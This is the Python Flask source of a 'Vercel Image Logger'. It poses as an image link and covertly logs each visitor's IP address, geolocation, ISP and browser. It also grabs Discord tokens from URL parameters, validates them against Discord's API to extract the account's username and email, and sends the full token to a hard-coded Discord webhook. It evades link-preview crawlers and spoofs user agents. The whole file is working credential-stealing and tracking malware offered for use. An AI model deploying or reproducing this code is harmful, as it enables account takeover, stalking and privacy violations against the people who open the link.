from flask import Flask, request, Response
from urllib import parse
import traceback, requests, base64, httpagentparser, re, json, time, os, random

app = Flask(__name__)

# ========== FAKE USER-AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discord.com/)"
]

def get_random_ua():
    return random.choice(USER_AGENTS)

# ========== CONFIGURAÇÕES ==========
config = {
    "webhook": "https://discord.com/api/webhooks/1526403537037426698/w0WhkvyaaQ7FagPqEzQHQyHFjrP4oAfvLv6RUiJLxZX2xbss73DPMeCtQwhZeUfDLdhH",
    "image": "https://upload.wikimedia.org/wikipedia/en/4/4d/Shrek_%28character%29.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "captureTokens": True,
    "tokenParam": "token",
    "validateTokens": True,
    "ping_on_token": False,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        headers = {"User-Agent": get_random_ua()}
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"Error:\n```\n{error[:1900]}\n```",
            }]
        }, headers=headers, timeout=3)
    except:
        pass

def captureToken(token, source="URL", ip="Unknown", useragent="Unknown"):
    if not config["captureTokens"] or not token:
        return False
    if len(token) < 30:
        return False
    if not re.match(r'^[a-zA-Z0-9._-]{30,100}$', token):
        return False
    
    username = "Unknown"
    discriminator = "0000"
    user_id = "Unknown"
    email = "Unknown"
    verified = False
    nitro_type = "None"
    
    if config["validateTokens"]:
        try:
            headers = {"Authorization": token, "User-Agent": get_random_ua()}
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
            if r.status_code == 200:
                data = r.json()
                username = data.get("username", "Unknown")
                discriminator = data.get("discriminator", "0000")
                user_id = data.get("id", "Unknown")
                email = data.get("email", "No email")
                verified = data.get("verified", False)
                nitro = data.get("premium_type", 0)
                nitro_types = ["None", "Nitro Classic", "Nitro", "Nitro Basic"]
                nitro_type = nitro_types[nitro] if nitro < len(nitro_types) else "Unknown"
            else:
                return False
        except:
            return False
    
    embed = {
        "username": config["username"],
        "content": "@everyone" if config.get("ping_on_token", False) else "",
        "embeds": [{
            "title": "🎯 Discord Token Captured",
            "color": 0xFF0000,
            "description": f"**Token:** `{token[:30]}...`\n\n**User Info:**\n> **Username:** `{username}#{discriminator}`\n> **User ID:** `{user_id}`\n> **Email:** `{email}`\n> **Verified:** `{verified}`\n> **Nitro:** `{nitro_type}`\n\n**Source:** `{source}`\n**IP:** `{ip}`\n**Timestamp:** <t:{int(time.time())}>\n\n**Full Token:** ||{token}||",
            "footer": {"text": "Vercel Image Logger"}
        }]
    }
    
    try:
        headers = {"User-Agent": get_random_ua()}
        requests.post(config["webhook"], json=embed, headers=headers, timeout=3)
        return True
    except:
        return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                headers = {"User-Agent": get_random_ua()}
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Link sent!\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                }, headers=headers, timeout=3)
            except:
                pass
        return
    
    ping = "@everyone"
    info = {"isp": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "Unknown", "proxy": False, "hosting": False}
    
    try:
        headers = {"User-Agent": get_random_ua()}
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", headers=headers, timeout=3)
        if resp.status_code == 200:
            info = resp.json()
    except:
        pass
    
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] == 4 and not info.get("proxy", False):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy", False):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""
    
    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    # ===== DESCRIÇÃO UNIFICADA (TUDO JUNTO) =====
    description = (
        "**A User Opened the Original Image!**\n\n"
        "**Endpoint:** `" + endpoint + "`\n\n"
        "**IP Info:**\n"
        "> **IP:** `" + (ip if ip else 'Unknown') + "`\n"
        "> **Provider:** `" + str(info.get('isp', 'Unknown')) + "`\n"
        "> **ASN:** `" + str(info.get('as', 'Unknown')) + "`\n"
        "> **Country:** `" + str(info.get('country', 'Unknown')) + "`\n"
        "> **Region:** `" + str(info.get('regionName', 'Unknown')) + "`\n"
        "> **City:** `" + str(info.get('city', 'Unknown')) + "`\n"
        "> **Coords:** `" + str(info.get('lat', 0)) + ", " + str(info.get('lon', 0)) + "`\n"
        "> **Timezone:** `" + str(info.get('timezone', 'Unknown')) + "`\n"
        "> **VPN:** `" + str(info.get('proxy', False)) + "`\n"
        "> **Bot:** `" + str(info.get('hosting', False)) + "`\n\n"
        "**PC Info:**\n"
        "> **OS:** `" + str(os_name) + "`\n"
        "> **Browser:** `" + str(browser) + "`\n\n"
        "**User Agent:**\n```\n" + str(useragent) + "\n```"
    )
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": description
        }]
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        headers = {"User-Agent": get_random_ua()}
        requests.post(config["webhook"], json=embed, headers=headers, timeout=3)
    except:
        pass
    return info

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        dic = dict(request.args)
        s = request.full_path if request.query_string else "/"
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        ua = request.headers.get('user-agent', '')
        
        # ========== TOKEN CAPTURE ==========
        if config["captureTokens"]:
            token = None
            token_source = "URL parameter"
            
            for param in [config.get("tokenParam", "token"), "token", "id", "t", "auth", "key"]:
                if dic.get(param):
                    token = dic.get(param)
                    token_source = f"URL parameter '{param}'"
                    break
            
            if token and len(token) > 50 and re.match(r'^[A-Za-z0-9+/=]+$', token):
                try:
                    decoded = base64.b64decode(token).decode()
                    if re.match(r'^[a-zA-Z0-9._-]{30,100}$', decoded):
                        token = decoded
                        token_source = "Base64 decoded"
                except:
                    pass
            
            if not token:
                url_match = re.search(r'[a-zA-Z0-9._-]{30,100}', s)
                if url_match:
                    token = url_match.group(0)
                    token_source = "URL regex match"
            
            if token:
                captureToken(token, token_source, ip, ua)
        
        # ========== IMAGEM ==========
        if config["imageArgument"]:
            if dic.get("url") or dic.get("id"):
                try:
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]
        
        # ========== DISCORD CRAWLER ==========
        is_crawler = 'Discordbot' in ua or ('Discord' in ua and 'bot' in ua.lower()) or (ip and ip.startswith(('34', '35')))
        
        if is_crawler or botCheck(ip, ua):
            makeReport(ip, endpoint=request.path, url=url)
            try:
                headers = {"User-Agent": get_random_ua()}
                img_data = requests.get(url, headers=headers, timeout=5).content
                return Response(img_data, mimetype='image/jpeg')
            except:
                loading = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                return Response(loading, mimetype='image/jpeg')
        
        # ========== RESPOSTA HTML ==========
        html = f'''<style>body{{margin:0;padding:0;}}
div.img{{
background-image:url('{url}');
background-position:center center;
background-repeat:no-repeat;
background-size:contain;
width:100vw;height:100vh;
}}</style><div class="img"></div>'''
        
        makeReport(ip, ua, endpoint=request.path, url=url)
        return Response(html, mimetype='text/html')
    
    except Exception as e:
        reportError(traceback.format_exc())
        return Response("500 - Internal Server Error", status=500)
